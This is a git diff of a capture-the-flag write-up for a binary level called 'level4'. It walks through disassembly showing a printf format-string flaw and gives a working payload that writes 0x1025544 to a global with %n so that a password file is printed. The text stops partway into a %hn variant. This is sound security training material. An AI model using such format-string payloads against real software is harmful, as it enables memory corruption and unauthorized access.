@@ -79,21 +79,21 @@ End of assembler dump.
 
 >buffer starts at `-0x208(%ebp)`
 
->Prompt the user for up to 512 bytes.
+>>Prompt the user for up to 512 bytes.
 
 ```
    0x0804847f <+40>:    lea    -0x208(%ebp),%eax
    0x08048485 <+46>:    mov    %eax,(%esp)
    0x08048488 <+49>:    call   0x8048444 <p>
 ```
->Call the `<p>` function with our buffer as parameter.
+>>Call the `<p>` function with our buffer as parameter.
 
 ```
    0x0804844a <+6>:     mov    0x8(%ebp),%eax
    0x0804844d <+9>:     mov    %eax,(%esp)
    0x08048450 <+12>:    call   0x8048340 <printf@plt>
 ```
->The `<p>` function calls `<printf@plt>` with our buffer.
+>>The `<p>` function calls `<printf@plt>` with our buffer.
 
 ```
    0x0804848d <+54>:    mov    0x8049810,%eax
@@ -102,7 +102,7 @@ End of assembler dump.
 ```
 >`0x8049810 <m>:  0x00000000`
 
->After the call to `<p>`, compare the value located at `0x8049810` avec with the hexadecimal constant 102 5544 (16 930 116 in decimal). If the two values differ, we `leave` and then `ret`, otherwise we call `<system@plt>`.
+>>After the call to `<p>`, compare the value located at `0x8049810` avec with the hexadecimal constant 102 5544 (16 930 116 in decimal). If the two values differ, we `leave` and then `ret`, otherwise we call `<system@plt>`.
 
 ```
    0x08048499 <+66>:    movl   $0x8048590,(%esp)
@@ -110,11 +110,11 @@ End of assembler dump.
 ```
 >`0x8048590: "/bin/cat /home/user/level5/.pass"`
 
->Display our flag.
+>>Display our flag.
 
 
 - So, we need to use `<printf@plt>` to assign the value 16930116 to `0x8049810`, we could do it like this
->`echo -ne '\x10\x98\x04\x08 %16930110x %12$n \n' | ./level4`
+>>`echo -ne '\x10\x98\x04\x08 %16930110x %12$n \n' | ./level4`
 
 
 - It would work, but this time, let's break down this assignment of 4 bytes (`%n`) into two assignments of 2 bytes each (`%hn`). We need to write 16 930 116, which is 102 5544 in hexadecimal:
